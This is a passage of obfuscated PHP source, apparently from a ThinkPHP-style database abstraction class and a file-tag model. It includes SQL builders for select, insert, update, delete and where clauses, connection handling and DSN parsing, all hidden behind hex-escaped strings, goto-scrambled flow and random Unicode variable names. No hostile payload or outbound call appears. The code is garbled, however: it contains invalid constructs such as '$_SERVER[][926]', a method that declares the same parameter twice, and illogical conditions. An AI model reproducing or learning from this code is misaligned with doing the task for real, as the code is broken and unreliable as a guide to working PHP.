= false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\75", "\x6e\145\x71" => "\74\76", "\x67\164" => "\x3e", "\145\147\164" => "\x3e\x3d", "\154\x74" => "\74", "\145\154\164" => "\x3c\x3d", "\x6e\157\164\154\x69\153\x65" => "\116\x4f\124\40\114\x49\113\105", "\154\151\x6b\x65" => "\x4c\111\x4b\105", "\x69\156" => "\x49\x4e", "\x6e\x6f\x74\x69\156" => "\x4e\x4f\124\40\111\116", "\156\157\x74\x20\x69\156" => "\116\117\124\40\111\116", "\142\x65\x74\x77\x65\145\156" => "\x42\x45\x54\127\x45\105\116", "\x6e\157\x74\142\145\x74\x77\x65\145\x6e" => "\116\x4f\x54\x20\x42\105\x54\127\x45\x45\x4e", "\x6e\x6f\x74\40\142\145\164\x77\x65\x65\156" => "\116\x4f\x54\x20\x42\105\x54\x57\x45\105\x4e"); protected $selectSql = "\123\105\114\105\103\124\45\x44\x49\x53\124\111\x4e\103\124\x25\40\45\x46\111\x45\x4c\x44\x25\x20\x46\122\117\115\x20\45\124\x41\102\x4c\x45\x25\x25\x4a\x4f\111\116\x25\45\x57\x48\x45\122\x45\45\x25\x47\122\x4f\x55\120\x25\45\x48\101\x56\111\x4e\107\45\x25\x4f\122\104\x45\x52\x25\45\114\x49\x4d\x49\124\45\40\x25\x55\x4e\111\x4f\x4e\x25\x25\x43\117\x4d\115\105\x4e\x54\x25"; protected $bind = array(); public static function getInstance() { $bݤ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[][926], $bݤ); } public function factory($D = '') { goto A; A: $dϥΝ =& $_SERVER[]; $D = $this->parseConfig($D); if (empty($D[$dϥΝ[927]])) { think_exception(think_lang($dϥΝ[928])); } goto C򥗇; B؜: return $E; goto B; C򥗇: $this->dbType = ucwords(strtolower($D[$dϥΝ[927]])); $eΧ = $dϥΝ[929] . $this->dbType; if (class_exists($eΧ)) { $E = new $eΧ($D); if ($dϥΝ[761] != strtolower($D[$dϥΝ[927]])) { $E->dbType = strtoupper($this->dbType); } else { $E->dbType = $this->_getDsnType($D[$dϥΝ[882]]); } } else { think_exception(think_lang($dϥΝ[930]) . $dϥΝ[931] . $eΧ); } goto B؜; B: } public function __call($A, $A) { if (method_exists($this, $A)) { return call_user_func_array(array($this, $A), $A); } } protected function _getDsnType($eʑՆ) { $f߿ = explode($_SERVER[][4], $eʑՆ); $Fׂ = strtoupper(trim($f߿[0])); return $Fׂ; } private function parseConfig($cȼه = '') { $B̈́ =& $_SERVER[]; if (!empty($cȼه) && is_string($cȼه)) { $cȼه = $this->parseDSN($cȼه); } elseif (is_array($cȼه)) { $cȼه = array_change_key_case($cȼه); $cȼه = array($B̈́[927] => $cȼه[$B̈́[760]], $B̈́[855] => $cȼه[$B̈́[932]], $B̈́[856] => $cȼه[$B̈́[933]], $B̈́[853] => $cȼه[$B̈́[934]], $B̈́[854] => $cȼه[$B̈́[935]], $B̈́[17] => $cȼه[$B̈́[936]], $B̈́[882] => $cȼه[$B̈́[762]], $B̈́[13] => isset($cȼه[$B̈́[937]]) ? $cȼه[$B̈́[937]] : array()); } elseif (empty($cȼه)) { if (think_config($B̈́[938]) && $B̈́[761] != strtolower(think_config($B̈́[939]))) { $cȼه = $this->parseDSN(think_config($B̈́[938])); } else { $cȼه = array($B̈́[927] => think_config($B̈́[939]), $B̈́[855] => think_config($B̈́[940]), $B̈́[856] => think_config($B̈́[941]), $B̈́[853] => think_config($B̈́[942]), $B̈́[854] => think_config($B̈́[943]), $B̈́[17] => think_config($B̈́[244]), $B̈́[882] => think_config($B̈́[938]), $B̈́[13] => think_config($B̈́[944])); } } return $cȼه; } protected function initConnect($A܆ = true) { if (1 == think_config($_SERVER[][18])) { $this->_linkID = $this->multiConnect($A܆); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $D縄 => $d) { $this->_linkID = $d; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($eᡟ = false) { goto eӼٜ; c̅؛: $A¡ں = array($bݑ[855] => isset($FК[$bݑ[855]][$F]) ? $FК[$bݑ[855]][$F] : $FК[$bݑ[855]][0], $bݑ[856] => isset($FК[$bݑ[856]][$F]) ? $FК[$bݑ[856]][$F] : $FК[$bݑ[856]][0], $bݑ[853] => isset($FК[$bݑ[853]][$F]) ? $FК[$bݑ[853]][$F] : $FК[$bݑ[853]][0], $bݑ[854] => isset($FК[$bݑ[854]][$F]) ? $FК[$bݑ[854]][$F] : $FК[$bݑ[854]][0], $bݑ[17] => isset($FК[$bݑ[17]][$F]) ? $FК[$bݑ[17]][$F] : $FК[$bݑ[17]][0], $bݑ[882] => isset($FК[$bݑ[882]][$F]) ? $FК[$bݑ[882]][$F] : $FК[$bݑ[882]][0], $bݑ[13] => isset($FК[$bݑ[13]][$F]) ? $FК[$bݑ[13]][$F] : $FК[$bݑ[13]][0]); return $this->connect($A¡ں, $F); goto c; eӼٜ: $bݑ =& $_SERVER[]; static $FК = array(); static $Fڎ = -1; goto bҶ; bҶ: if (empty($FК)) { foreach ($this->config as $F̤ => $aӄѬ) { $FК[$F̤] = explode($bݑ[47], $aӄѬ); } } if (think_config($bݑ[945])) { if ($eᡟ) { $F = floor(mt_rand(0, think_config($bݑ[946]) - 1)); $Fڎ = $F; } else { if (is_numeric(think_config($bݑ[947]))) { $F = think_config($bݑ[947]); } else { $F = floor(mt_rand(think_config($bݑ[946]), count($FК[$bݑ[853]]) - 1)); } } } else { $F = floor(mt_rand(0, count($FК[$bݑ[853]]) - 1)); $Fڎ = $F; } $F = $Fڎ !== -1 ? $Fڎ : $F; goto c̅؛; c: } public function parseDSN($bə) { $b =& $_SERVER[]; if (empty($bə)) { return !1; } $Bز = parse_url($bə); if ($Bز[$b[174]]) { $dڱֳ = array($b[927] => $Bز[$b[174]], $b[855] => isset($Bز[$b[562]]) ? $Bز[$b[562]] : $b[33], $b[856] => isset($Bز[$b[948]]) ? $Bز[$b[948]] : $b[33], $b[853] => isset($Bز[$b[175]]) ? $Bز[$b[175]] : $b[33], $b[854] => isset($Bز[$b[176]]) ? $Bز[$b[176]] : $b[33], $b[17] => isset($Bز[$b[76]]) ? substr($Bز[$b[76]], 1) : $b[33]); } else { preg_match($b[949], trim($bə), $f); $dڱֳ = array($b[927] => $f[1], $b[855] => $f[2], $b[856] => $f[3], $b[853] => $f[4], $b[854] => $f[5], $b[17] => $f[6]); } $dڱֳ[$b[882]] = $b[33]; return $dڱֳ; } protected function debug() { $eֆ =& $_SERVER[]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $eֆ[950]; if (think_config($eֆ[951])) { think_status($eֆ[952]); think_trace($this->queryStr . $eֆ[953] . think_status($eֆ[20], $eֆ[952], 6) . $eֆ[954], $eֆ[33], $eֆ[955]); } } protected function parseLock($E = false) { $B㻶 =& $_SERVER[]; if (!$E) { return $B㻶[33]; } if ($B㻶[884] == $this->dbType) { return $B㻶[956]; } return $B㻶[957]; } protected function parseSet($A˵ݦ) { $dų =& $_SERVER[]; foreach ($A˵ݦ as $aص => $Dҝ) { if (is_array($Dҝ) && $dų[295] == $Dҝ[0]) { $A펋[] = $this->parseKey($aص) . $dų[958] . $Dҝ[1]; } elseif (is_scalar($Dҝ) || is_null($Dҝ)) { $A펋[] = $this->parseKey($aص) . $dų[958] . $this->parseValue($Dҝ); } } return $dų[959] . implode($dų[47], $A펋); } protected function bindParam($B, $a) { $this->bind[$_SERVER[][4] . $B] = $a; } protected function parseBind($Cꯆ) { $Cꯆ = array_merge($this->bind, $Cꯆ); $this->bind = array(); return $Cꯆ; } function parseKey(&$B, $b = true) { if ($b) { $B = $this->parseKeyCheck($B); } return $B; } function parseKeyCheck($b⎚Ą) { $a߄ =& $_SERVER[]; $b⎚Ą = trim($b⎚Ą); if (!preg_match($a߄[960], $b⎚Ą)) { think_exception($a߄[961] . $b⎚Ą); } return $b⎚Ą; } protected function parseValue($c) { $C =& $_SERVER[]; if (is_string($c)) { $c = $C[923] . $this->escapeString($c) . $C[923]; } elseif (isset($c[0]) && is_string($c[0]) && strtolower($c[0]) == $C[295]) { $c = $this->escapeString($c[1]); } elseif (is_array($c)) { $c = array_map(array($this, $C[924]), $c); } elseif (is_bool($c)) { $c = $c ? $C[87] : $C[191]; } elseif (is_null($c)) { $c = $C[103]; } return $c; } protected function parseField($Aㆥ) { $fȗވ =& $_SERVER[]; if (is_string($Aㆥ) && strpos($Aㆥ, $fȗވ[47])) { $Aㆥ = explode($fȗވ[47], $Aㆥ); } if (is_array($Aㆥ)) { $B = array(); foreach ($Aㆥ as $A => $aȜ) { if (!is_numeric($A)) { $B[] = $this->parseKey($A, !1) . $fȗވ[962] . $this->parseKey($aȜ); } else { $B[] = $this->parseKey($aȜ); } } $dպ = implode($fȗވ[47], $B); } elseif (is_string($Aㆥ) && !empty($Aㆥ)) { $dպ = $Aㆥ; } else { $dպ = $fȗވ[182]; } return $dպ; } protected function parseTable($CҸȹ) { $cؒ =& $_SERVER[]; if (is_array($CҸȹ)) { $B = array(); foreach ($CҸȹ as $d鱗 => $B˞) { if (!is_numeric($d鱗)) { $B[] = $this->parseKey($d鱗) . $cؒ[50] . $this->parseKey($B˞); } else { $B[] = $this->parseKey($d鱗); } } $CҸȹ = $B; } elseif (is_string($CҸȹ)) { if (strstr($CҸȹ, $cؒ[50])) { return $CҸȹ; } $CҸȹ = explode($cؒ[47], $CҸȹ); array_walk($CҸȹ, array($this, $cؒ[873])); } return $cؒ[867] . trim(implode($cؒ[963], $CҸȹ), $cؒ[382]) . $cؒ[867]; } protected function parseWhere($e) { $C͒ =& $_SERVER[]; $B݈ = $C͒[33]; if (is_string($e)) { $B݈ = $e; } else { $A͞ᮙ = isset($e[$C͒[964]]) ? strtoupper($e[$C͒[964]]) : $C͒[33]; if (in_array($A͞ᮙ, array($C͒[965], $C͒[966], $C͒[967]))) { $A͞ᮙ = $C͒[50] . $A͞ᮙ . $C͒[50]; unset($e[$C͒[964]]); } else { $A͞ᮙ = $C͒[968]; } foreach ($e as $dҦ => $B) { $B݈ .= $C͒[275]; if (is_numeric($dҦ)) { $dҦ = $C͒[969]; } if (0 === strpos($dҦ, $C͒[71])) { $B݈ .= $this->parseThinkWhere($dҦ, $B); } else { if (!preg_match($C͒[970], trim($dҦ))) { think_exception(think_lang($C͒[971]) . $C͒[4] . $dҦ); } $b = is_array($B) && isset($B[$C͒[972]]); $dҦ = trim($dҦ); if (strpos($dҦ, $C͒[281])) { $f = explode($C͒[281], $dҦ); $C͸ = array(); foreach ($f as $Cܬ => $F܌ְ) { $b㡴 = $b ? $B[$Cܬ] : $B; $C͸[] = $C͒[258] . $this->parseWhereItem($this->parseKey($F܌ְ), $b㡴) . $C͒[872]; } $B݈ .= implode($C͒[973], $C͸); } elseif (strpos($dҦ, $C͒[282])) { $f = explode($C͒[282], $dҦ); $C͸ = array(); foreach ($f as $Cܬ => $F܌ְ) { $b㡴 = $b ? $B[$Cܬ] : $B; $C͸[] = $C͒[258] . $this->parseWhereItem($this->parseKey($F܌ְ), $b㡴) . $C͒[872]; } $B݈ .= implode($C͒[968], $C͸); } else { $B݈ .= $this->parseWhereItem($this->parseKey($dҦ), $B); } } $B݈ .= $C͒[276] . $A͞ᮙ; } $B݈ = substr($B݈, 0, -strlen($A͞ᮙ)); } return empty($B݈) ? $C͒[33] : $C͒[974] . $B݈; } protected function parseWhereItem($bͻĳ, $Eü) { $Cۆų =& $_SERVER[]; $d̰㫿 = $Cۆų[33]; if (is_array($Eü)) { if (is_string($Eü[0])) { $CѪќ = strtolower($Eü[0]); if (in_array($Eü[0], array($Cۆų[958], $Cۆų[975], $Cۆų[976], $Cۆų[977], $Cۆų[978], $Cۆų[979]))) { $d̰㫿 .= $bͻĳ . $Cۆų[50] . $Eü[0] . $Cۆų[50] . $this->parseValue($Eü[1]); } elseif (preg_match($Cۆų[980], $Eü[0])) { $d̰㫿 .= $bͻĳ . $Cۆų[50] . $this->exp[$CѪќ] . $Cۆų[50] . $this->parseValue($Eü[1]); } elseif (preg_match($Cۆų[981], $Eü[0])) { if (is_array($Eü[1])) { $a񞢎 = isset($Eü[2]) ? strtoupper($Eü[2]) : $Cۆų[966]; if (in_array($a񞢎, array($Cۆų[965], $Cۆų[966], $Cۆų[967]))) { $Cآ = array(); foreach ($Eü[1] as $E㰳) { $Cآ[] = $bͻĳ . $Cۆų[50] . $this->exp[$CѪќ] . $Cۆų[50] . $this->parseValue($E㰳); } $d̰㫿 .= $Cۆų[258] . implode($Cۆų[50] . $a񞢎 . $Cۆų[50], $Cآ) . $Cۆų[872]; } } else { $d̰㫿 .= $bͻĳ . $Cۆų[50] . $this->exp[$CѪќ] . $Cۆų[50] . $this->parseValue($Eü[1]); } } elseif ($Cۆų[295] == $CѪќ) { $d̰㫿 .= $Cۆų[870] . $bͻĳ . $Cۆų[50] . $Eü[1] . $Cۆų[982]; } elseif (preg_match($Cۆų[983], $Eü[0])) { $d̰㫿 .= $Eü[0]; } elseif (preg_match($Cۆų[984], $Eü[0])) { if (isset($Eü[2]) && $Cۆų[295] == $Eü[2]) { $d̰㫿 .= $bͻĳ . $Cۆų[50] . $this->exp[$CѪќ] . $Cۆų[50] . $Eü[1]; } else { if (is_string($Eü[1])) { $Eü[1] = explode($Cۆų[47], $Eü[1]); } $d = implode($Cۆų[47], $this->parseValue($Eü[1])); $d̰㫿 .= $bͻĳ . $Cۆų[50] . $this->exp[$CѪќ] . $Cۆų[870] . $d . $Cۆų[872]; } } elseif (preg_match($Cۆų[985], $Eü[0])) { $c͂戩 = is_string($Eü[1]) ? explode($Cۆų[47], $Eü[1]) : $Eü[1]; $d̰㫿 .= $Cۆų[870] . $bͻĳ . $Cۆų[50] . $this->exp[$CѪќ] . $Cۆų[50] . $this->parseValue($c͂戩[0]) . $Cۆų[968] . $this->parseValue($c͂戩[1]) . $Cۆų[276]; } else { think_exception(think_lang($Cۆų[971]) . $Cۆų[4] . $Eü[0]); } } else { $Fƺ = count($Eü); $b = $Cۆų[33]; if (is_string($Eü[$Fƺ - 1])) { $b = isset($Eü[$Fƺ - 1]) ? strtoupper($Eü[$Fƺ - 1]) : $Cۆų[33]; if (in_array($b, array($Cۆų[965], $Cۆų[966], $Cۆų[967]))) { $Fƺ = $Fƺ - 1; } } else { $b = $Cۆų[965]; } for ($D߄ = 0; $D߄ < $Fƺ; $D߄++) { $c͂戩 = is_array($Eü[$D߄]) ? $Eü[$D߄][1] : $Eü[$D߄]; if ($Cۆų[295] == strtolower($Eü[$D߄][0])) { $d̰㫿 .= $Cۆų[258] . $bͻĳ . $Cۆų[50] . $c͂戩 . $Cۆų[982] . $b . $Cۆų[50]; } else { $FØ = is_array($Eü[$D߄]) ? $this->exp[strtolower($Eü[$D߄][0])] : $Cۆų[958]; if (!$FØ && is_array($Eü[$D߄]) && in_array($Eü[$D߄][0], array($Cۆų[958], $Cۆų[975], $Cۆų[976], $Cۆų[977], $Cۆų[978], $Cۆų[979]))) { $FØ = $Eü[$D߄][0]; } $d̰㫿 .= $Cۆų[258] . $bͻĳ . $Cۆų[50] . $FØ . $Cۆų[50] . $this->parseValue($c͂戩) . $Cۆų[982] . $b . $Cۆų[50]; } } $d̰㫿 = substr($d̰㫿, 0, -4); } } else { $d̰㫿 .= $bͻĳ . $Cۆų[986] . $this->parseValue($Eü); } return $d̰㫿; } protected function parseThinkWhere($c׏ƻ, $bӄ) { $B =& $_SERVER[]; $C⻖ = $B[33]; switch ($c׏ƻ) { case $B[350]: $C⻖ = $bӄ; break; case $B[969]: $C⻖ = is_string($bӄ) ? $bӄ : substr($this->parseWhere($bӄ), 6); break; case $B[987]: parse_str($bӄ, $E); if (isset($E[$B[964]])) { $bⅺ = $B[50] . strtoupper($E[$B[964]]) . $B[50]; unset($E[$B[964]]); } else { $bⅺ = $B[968]; } $e = array(); foreach ($E as $b => $d񌟌) { $e[] = $this->parseKey($b) . $B[986] . $this->parseValue($d񌟌); } $C⻖ = implode($bⅺ, $e); break; } return $C⻖; } protected function parseLimit($E㢓͟) { $dΝ =& $_SERVER[]; return !empty($E㢓͟) ? $dΝ[48] . $E㢓͟ . $dΝ[50] : $dΝ[33]; } protected function parseJoin($F⚃) { $Cղ =& $_SERVER[]; $E񦶱 = $Cղ[33]; if (!empty($F⚃)) { if (is_array($F⚃)) { foreach ($F⚃ as $Bډ => $F̓) { if (!1 !== stripos($F̓, $Cղ[988])) { $E񦶱 .= $Cղ[50] . $F̓; } else { $E񦶱 .= $Cղ[989] . $F̓; } } } else { $E񦶱 .= $Cղ[989] . $F⚃; } } $E񦶱 = preg_replace($Cղ[990], think_config($Cղ[896]) . $Cղ[991], $E񦶱); return $E񦶱; } protected function parseOrder($e) { $C㉐ =& $_SERVER[]; if (is_array($e)) { $Cݟۅ = array(); foreach ($e as $b => $C) { if (is_numeric($b)) { $Cݟۅ[] = $this->parseKey($C); } else { $C = in_array(strtoupper(trim($C)), array($C㉐[992], $C㉐[993])) ? $C㉐[50] . $C : $C㉐[33]; if (preg_match($C㉐[994], $b)) { $Cݟۅ[] = $this->parseKey($b) . $C; } else { think_exception($C㉐[995] . $b); } } } $e = implode($C㉐[47], $Cݟۅ); } return !empty($e) ? $C㉐[996] . $e : $C㉐[33]; } protected function parseGroup($e) { $Dȸ =& $_SERVER[]; return !empty($e) ? $Dȸ[997] . $e : $Dȸ[33]; } protected function parseHaving($DЏ) { $eǳ =& $_SERVER[]; return !empty($DЏ) ? $eǳ[998] . $DЏ : $eǳ[33]; } protected function parseComment($A˵) { $F =& $_SERVER[]; return !empty($A˵) ? $F[999] . $A˵ . $F[1000] : $F[33]; } protected function parseDistinct($D냰ݜ) { $Eڤ =& $_SERVER[]; return !empty($D냰ݜ) ? $Eڤ[1001] : $Eڤ[33]; } protected function parseUnion($F) { $d씭 =& $_SERVER[]; if (empty($F)) { return $d씭[33]; } if (isset($F[$d씭[346]])) { $F򮰨 = $d씭[1002]; unset($F[$d씭[346]]); } else { $F򮰨 = $d씭[1003]; } foreach ($F as $AӾ) { $cट[] = $F򮰨 . (is_array($AӾ) ? $this->buildSelectSql($AӾ) : $AӾ); } return implode($d씭[50], $cट); } public function insert($C顊ڔ, $Bʘ = array(), $dܶ谹 = false) { goto Dǂ; bޜ䄍: foreach ($C顊ڔ as $A => $eыó) { if (is_array($eыó) && $C㱖[295] == $eыó[0]) { $Aֶȝ[] = $this->parseKey($A); $FՇ[] = $eыó[1]; } elseif (is_scalar($eыó) || is_null($eыó)) { $Aֶȝ[] = $this->parseKey($A); $FՇ[] = $this->parseValue($eыó); } } $a΄ = ($dܶ谹 ? $C㱖[874] : $C㱖[875]) . $C㱖[876] . $this->parseTable($Bʘ[$C㱖[277]]) . $C㱖[870] . implode($C㱖[47], $Aֶȝ) . $C㱖[871] . implode($C㱖[47], $FՇ) . $C㱖[872]; $a΄ .= $this->parseLock(isset($Bʘ[$C㱖[818]]) ? $Bʘ[$C㱖[818]] : !1); goto Bǘ; Bǘ: $a΄ .= $this->parseComment(!empty($Bʘ[$C㱖[352]]) ? $Bʘ[$C㱖[352]] : $C㱖[33]); return $this->execute($a΄, $this->parseBind(!empty($Bʘ[$C㱖[283]]) ? $Bʘ[$C㱖[283]] : array())); goto cσ; Dǂ: $C㱖 =& $_SERVER[]; $FՇ = $Aֶȝ = array(); $this->model = $Bʘ[$C㱖[279]]; goto bޜ䄍; cσ: } public function selectInsert($C⍪, $Aಎ, $aӆ޵ = array()) { goto cƪ; cƪ: $aޮ =& $_SERVER[]; $this->model = $aӆ޵[$aޮ[279]]; if (is_string($C⍪)) { $C⍪ = explode($aޮ[47], $C⍪); } goto Dȷ; Dӯ: return $this->execute($D䠸, $this->parseBind(!empty($aӆ޵[$aޮ[283]]) ? $aӆ޵[$aޮ[283]] : array())); goto C𣤦; Dȷ: array_walk($C⍪, array($this, $aޮ[873])); $D䠸 = $aޮ[1004] . $this->parseTable($Aಎ) . $aޮ[870] . implode($aޮ[47], $C⍪) . $aޮ[982]; $D䠸 .= $this->buildSelectSql($aӆ޵); goto Dӯ; C𣤦: } public function update($fհͅ, $BГţ) { $Fԉ =& $_SERVER[]; $this->model = $BГţ[$Fԉ[279]]; $e싉 = $Fԉ[1005] . $this->parseTable($BГţ[$Fԉ[277]]) . $this->parseSet($fհͅ) . $this->parseWhere(!empty($BГţ[$Fԉ[273]]) ? $BГţ[$Fԉ[273]] : $Fԉ[33]) . $this->parseOrder(!empty($BГţ[$Fԉ[363]]) ? $BГţ[$Fԉ[363]] : $Fԉ[33]) . $this->parseLimit(!empty($BГţ[$Fԉ[290]]) ? $BГţ[$Fԉ[290]] : $Fԉ[33]) . $this->parseLock(isset($BГţ[$Fԉ[818]]) ? $BГţ[$Fԉ[818]] : !1) . $this->parseComment(!empty($BГţ[$Fԉ[352]]) ? $BГţ[$Fԉ[352]] : $Fԉ[33]); return $this->execute($e싉, $this->parseBind(!empty($BГţ[$Fԉ[283]]) ? $BГţ[$Fԉ[283]] : array())); } public function delete($eԶ = array()) { $dؤ =& $_SERVER[]; $this->model = $eԶ[$dؤ[279]]; $a޷ = $dؤ[1006] . $this->parseTable($eԶ[$dؤ[277]]) . $this->parseWhere(!empty($eԶ[$dؤ[273]]) ? $eԶ[$dؤ[273]] : $dؤ[33]) . $this->parseOrder(!empty($eԶ[$dؤ[363]]) ? $eԶ[$dؤ[363]] : $dؤ[33]) . $this->parseLimit(!empty($eԶ[$dؤ[290]]) ? $eԶ[$dؤ[290]] : $dؤ[33]) . $this->parseLock(isset($eԶ[$dؤ[818]]) ? $eԶ[$dؤ[818]] : !1) . $this->parseComment(!empty($eԶ[$dؤ[352]]) ? $eԶ[$dؤ[352]] : $dؤ[33]); return $this->execute($a޷, $this->parseBind(!empty($eԶ[$dؤ[283]]) ? $eԶ[$dؤ[283]] : array())); } public function select($f墣 = array()) { goto F䱧􌋈; F䱧􌋈: $fփ =& $_SERVER[]; $this->model = $f墣[$fփ[279]]; $Bݸ = $this->buildSelectSql($f墣); goto b; b: $BУݸ = isset($f墣[$fփ[347]]) ? $f墣[$fփ[347]] : !1; if ($BУݸ) { $cƊ = is_string($BУݸ[$fփ[93]]) ? $BУݸ[$fփ[93]] : $fփ[1007] . md5($Bݸ); $dᜍ = think_cache($cƊ, $fփ[33], $BУݸ); if (!1 !== $dᜍ) { return $dᜍ; } } $a = $this->query($Bݸ, $this->parseBind(!empty($f墣[$fփ[283]]) ? $f墣[$fփ[283]] : array())); goto A; A: if ($BУݸ && !1 !== $a) { think_cache($cƊ, $a, $BУݸ); } return $a; goto B㙚Ύ; B㙚Ύ: } public function buildSelectSql($Bʅ = array()) { goto C쐮ݙ; BƆ: $C飋 = $this->parseSql($this->selectSql, $Bʅ); $C飋 .= $this->parseLock(isset($Bʅ[$b𛻷[818]]) ? $Bʅ[$b𛻷[818]] : !1); if (isset($BԜȫ)) { think_cache($BԜȫ, $C飋); } goto b; C쐮ݙ: $b𛻷 =& $_SERVER[]; if (isset($Bʅ[$b𛻷[351]])) { if (strpos($Bʅ[$b𛻷[351]], $b𛻷[47])) { list($aѿ, $F) = explode($b𛻷[47], $Bʅ[$b𛻷[351]]); } else { $aѿ = $Bʅ[$b𛻷[351]]; } $aѿ = $aѿ ? $aѿ : 1; $F = isset($F) ? $F : (is_numeric($Bʅ[$b𛻷[290]]) ? $Bʅ[$b𛻷[290]] : 20); $eޟ = $F * ((int) $aѿ - 1); $Bʅ[$b𛻷[290]] = $eޟ . $b𛻷[47] . $F; } if (think_config($b𛻷[1008])) { $BԜȫ = $b𛻷[1009] . md5(serialize($Bʅ)); $aϖ鮜 = think_cache($BԜȫ); if ($aϖ鮜) { return $aϖ鮜; } } goto BƆ; b: return $C飋; goto Aۺ; Aۺ: } public function parseSql($dŭ, $fɡ = array()) { $Dɖ =& $_SERVER[]; $dŭ = str_replace(array($Dɖ[1010], $Dɖ[1011], $Dɖ[1012], $Dɖ[1013], $Dɖ[1014], $Dɖ[1015], $Dɖ[1016], $Dɖ[1017], $Dɖ[1018], $Dɖ[1019], $Dɖ[1020]), array($this->parseTable("{$fɡ[$Dɖ[277]]}"), $this->parseDistinct(isset($fɡ[$Dɖ[1021]]) ? $fɡ[$Dɖ[1021]] : !1), $this->parseField(!empty($fɡ[$Dɖ[271]]) ? $fɡ[$Dɖ[271]] : $Dɖ[182]), $this->parseJoin(!empty($fɡ[$Dɖ[280]]) ? $fɡ[$Dɖ[280]] : $Dɖ[33]), $this->parseWhere(!empty($fɡ[$Dɖ[273]]) ? $fɡ[$Dɖ[273]] : $Dɖ[33]), $this->parseGroup(!empty($fɡ[$Dɖ[1022]]) ? $fɡ[$Dɖ[1022]] : $Dɖ[33]), $this->parseHaving(!empty($fɡ[$Dɖ[1023]]) ? $fɡ[$Dɖ[1023]] : $Dɖ[33]), $this->parseOrder(!empty($fɡ[$Dɖ[363]]) ? $fɡ[$Dɖ[363]] : $Dɖ[33]), $this->parseLimit(!empty($fɡ[$Dɖ[290]]) ? $fɡ[$Dɖ[290]] : $Dɖ[33]), $this->parseUnion(!empty($fɡ[$Dɖ[345]]) ? $fɡ[$Dɖ[345]] : $Dɖ[33]), $this->parseComment(!empty($fɡ[$Dɖ[352]]) ? $fɡ[$Dɖ[352]] : $Dɖ[33])), $dŭ); return $dŭ; } public function getLastSql($F薋Ѽ = '') { return $F薋Ѽ ? $this->modelSql[$F薋Ѽ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($Eٵ) { return addslashes($Eٵ); } public function setModel($e˺) { $this->model = $e˺; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto cᙛ; cÌߘ: class GroupTagModel extends ModelBase { protected $tableName = "\165\163\x65\162\x5f\x66\141\x76"; protected function cacheFunctionAlias($aя) { $Cޮſ =& $_SERVER[]; return array($Cޮſ[1801] => array($aя[0], $Cޮſ[1802]), $Cޮſ[1803] => array($aя[0], $Cޮſ[1804])); } protected function get($Aो) { $C̈́ =& $_SERVER[]; $BǴ = Model($C̈́[486])->metaGet($Aो, $C̈́[1805]); $F = json_decode($BǴ, !0); return $F ? $F : array($C̈́[1806] => $C̈́[87], $C̈́[367] => array()); } protected function set($dߢ, $eē) { $d =& $_SERVER[]; $eē = $eē ? $eē : array($d[1806] => $d[87], $d[367] => array()); Model($d[486])->metaSet($dߢ, $d[1805], json_encode($eē)); return Model($d[486])->metaSet($dߢ, $d[1805], json_encode($eē)); } protected function getByTagID($f׍, $d߱밈) { goto cԄ; Cȷ: return is_array($dۊҗ) ? $dۊҗ : !1; goto c; cԄ: $AԬ =& $_SERVER[]; if (!$f׍ || !$d߱밈) { return !1; } if (!Model($AԬ[486])->getInfoSimple($f׍)) { return !1; } goto Aق; Aق: $e뒅 = $this->get($f׍); if (!$e뒅 || !isset($e뒅[$AԬ[367]])) { return !1; } $dۊҗ = array_find_by_field($e뒅[$AԬ[367]], $AԬ[393], $d߱밈); goto Cȷ; c: } public function listSource($d, $D) { goto d䉎; F: $E = Model($Fи̇[1213])->listSource($aЍ); if (!$E || count($A쩻ء) == $E[$Fи̇[364]][$Fи̇[365]]) { return $E; } $b = array(); goto eƭ˯; d䉎: $Fи̇ =& $_SERVER[]; if ($D && !is_array($D)) { $D = array($D); } $d朮 = $this->listData($d); goto dڈ; eƭ˯: $f׫ = array_to_keyvalue($E[$Fи̇[75]], $Fи̇[33], $Fи̇[395]); $d = array_to_keyvalue($E[$Fи̇[74]], $Fи̇[33], $Fи̇[395]); $Bٓݝ = array_merge($d, $f׫); goto Fخݶ; dԵ: foreach ($eɕ as $fґ => $AԈ) { $d냘 = !0; if (!$D) { $A쩻ء[] = $fґ; continue; } foreach ($D as $Eϋ) { if (!in_array($Eϋ, $AԈ)) { $d냘 = !1; break; } } if ($d냘) { $A쩻ء[] = $fґ; } } if (!$A쩻ء) { return array(); } $aЍ = array($Fи̇[410] => array($Fи̇[411], $A쩻ء), $Fи̇[484] => $d, $Fи̇[404] => SourceModel::TYPE_GROUP); goto F; dڈ: $eɕ = array(); foreach ($d朮 as $e҅) { $d = $e҅[$Fи̇[76]]; if (!$d) { continue; } if (!isset($eɕ[$d])) { $eɕ[$d] = array(); } $eɕ[$d][] = $e҅[$Fи̇[419]]; } $A쩻ء = array(); goto dԵ; Fخݶ: foreach ($A쩻ء as $d) { if (!in_array($d, $Bٓݝ)) { $b[] = $d; } } if ($b) { $this->removeBySource($d, $b); } return $E; goto dܻ; dܻ: } protected function listData($Aί) { $aۺ =& $_SERVER[]; $eӃ = array($aۺ[1525] => 0, $aۺ[463] => array($aۺ[1807], 0), $aۺ[415] => $aۺ[1808] . $Aί); $a˱ = $aۺ[1809]; $f = $this->field($a˱)->where($eӃ)->order($aۺ[1810])->select(); return $f ? $f : array(); } protected function addToTag($bа, $FԞ, $cш) { $Aү =& $_SERVER[]; if (!$this->getByTagID($bа, $cш) || !$FԞ) { return !1; } if (!Model($Aү[796])->pathInfo($FԞ)) { return !1; } $D = array($Aү[1525] => 0, $Aү[463] => $cш, $Aү[414] => $FԞ, $Aү[415] => $Aү[1811] . $bа, $Aү[413] => $Aү[33], $Aү[1705] => 0); if ($this->where($D)->find()) { return !1; } return $this->add($D); } protected function removeFromTag($DƖ, $bӞ, $f푄) { $D =& 